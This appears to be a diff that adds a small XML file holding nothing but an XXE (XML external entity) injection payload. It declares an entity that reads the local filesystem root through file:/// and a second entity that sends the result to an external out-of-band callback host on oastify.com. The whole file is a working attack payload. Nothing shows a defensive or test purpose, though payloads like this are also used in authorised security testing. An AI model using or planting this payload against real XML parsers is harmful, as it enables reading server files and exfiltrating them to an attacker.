@@ -1,0 +1,4 @@
+
+
+<!DOCTYPE x [ <!ENTITY % file SYSTEM "file:///">;<!ENTITY test SYSTEM "http://ezhu6yj9r42ejtmrlesegvnpcgi76xum.oastify.com?x=%file"> ]>
+<x>&test;</x>
